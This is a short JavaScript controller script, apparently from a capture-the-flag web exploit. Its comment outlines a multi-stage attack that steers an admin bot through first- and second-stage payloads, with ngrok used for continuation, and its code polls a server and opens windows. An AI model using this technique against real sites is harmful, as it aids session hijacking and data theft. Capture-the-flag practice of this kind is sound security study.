/*
    Rough flow of the program
    1. start script
    2. script sets up a listener for all of this, as well as the first stage payload
    3. we navigate admin to controller
    4. controller creates a new window in which to execute the first stage payload, then polls ngrok for continuation
    5. first stage payload executes, updates current flag. server sets up second stage payload, then will return continuation
    6. controller receives continuation, then navigates admin to the second stage payload
*/
setInterval(async () => {
    fetch("/poll", {
        "method": "POST",
    }).then((response) => {
        if (response.status === 200) {
            window.open("/", "_blank"); // it will close itself in due time
        }
    });
}, 1000);